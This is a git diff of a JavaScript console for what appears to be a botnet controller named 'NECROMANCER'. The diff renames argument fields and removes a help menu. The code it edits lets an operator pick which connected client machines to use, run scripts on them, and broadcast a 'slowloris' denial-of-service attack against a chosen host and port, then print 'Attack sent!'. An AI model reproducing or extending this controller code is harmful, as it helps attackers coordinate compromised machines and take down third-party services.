@@ -1,7 +1,6 @@
 import readline from "readline";
 import fs from "fs";
 import { clientModules, broadcast } from "./server.js";
-import help from "../config/help.json" assert { type: "json" };
 
 const rl = readline.createInterface({
 	input: process.stdin,
@@ -15,12 +14,11 @@ export function prompt() {
 	rl.question("\x1b[31m[NECROMANCER]\x1b[0m ", (message) => {
 		message = message.toLowerCase();
 
-		// Commands
 		const commandArgs = {
-			firstArg: message.split(" ")[1],
-			secondArg: message.split(" ")[2],
-			thirdArg: message.split(" ")[3],
-			fourthArg: message.split(" ")[4],
+			first: message.split(" ")[1],
+			second: message.split(" ")[2],
+			third: message.split(" ")[3],
+			fourth: message.split(" ")[4],
 		};
 
 		if (message.startsWith("instances")) {
@@ -28,49 +26,29 @@ export function prompt() {
 				console.log(
 					`Instances: ${clientModules.clientInstances.length}`
 				);
-			} else if (commandArgs.firstArg <= clientModules.clients.length) {
+			} else if (commandArgs.first <= clientModules.clients.length) {
 				clientModules.clientInstances = [...clientModules.clients];
 				clientModules.clientInstances =
 					clientModules.clientInstances.slice(
 						0,
-						commandArgs.firstArg
+						commandArgs.first
 					);
 			}
 		}
 
-		if (commandArgs.firstArg === "all")
+		if (commandArgs.first === "all")
 			clientModules.clientInstances = [...clientModules.clients];
-
-		if (message.startsWith("help")) {
-			if (message === "help") {
-				console.log("Commands:");
-				for (let i = 0; i < help.length; i++) {
-					console.log(help[i].command);
-				}
-			} else if (
-				help.filter((i) => i.command === commandArgs.firstArg).length >
-				0
-			) {
-				let commandIndex = help
-					.map((i) => i.command)
-					.indexOf(commandArgs.firstArg);
-
-				console.log(
-					`Functionality: ${help[commandIndex].functionality}\nUsage: ${help[commandIndex].usage}`
-				);
-			}
-		}
 
 		if (message.startsWith("select")) {
 			clientModules.clientInstances = Array(
-				clientModules.clientInstances[commandArgs.firstArg]
+				clientModules.clientInstances[commandArgs.first]
 			).filter((i) => i !== undefined);
 		}
 
 		if (message.startsWith("silent")) {
 			if (message === "silent")
 				console.log(`silent: ${clientModules.silent}`);
-			else if (commandArgs.firstArg === "true") {
+			else if (commandArgs.first === "true") {
 				clientModules.silent = true;
 			} else {
 				clientModules.silent = false;
@@ -79,7 +57,7 @@ export function prompt() {
 
 		if (message.startsWith("logging")) {
 			if (message === "logging") console.log(`logging: ${logging}`);
-			else if (commandArgs.firstArg === "true") {
+			else if (commandArgs.first === "true") {
 				logging = true;
 				clientModules.silent = true;
 			} else {
@@ -103,13 +81,12 @@ export function prompt() {
 			}
 		}
 
-		// Scripts and attacks
 		if (message === "scripts") {
 			listScripts();
 		}
 
 		if (message.startsWith("run")) {
-			runScript(commandArgs.firstArg);
+			runScript(commandArgs.first);
 		}
 
 		if (message.startsWith("slowloris")) {
@@ -117,14 +94,14 @@ export function prompt() {
 				console.log(
 					"Please provide arguments: slowloris (host) (port) (duration ms) (sockets)"
 				);
-			} else if (commandArgs.firstArg !== undefined) {
+			} else if (commandArgs.first !== undefined) {
 				broadcast(message);
 				console.log(`Attack sent!`);
 			}
 
-			let duration = commandArgs.thirdArg;
+			let duration = commandArgs.third;
 
-			if (commandArgs.thirdArg === undefined) {
+			if (commandArgs.third === undefined) {
 				duration = 60000;
 			}
 
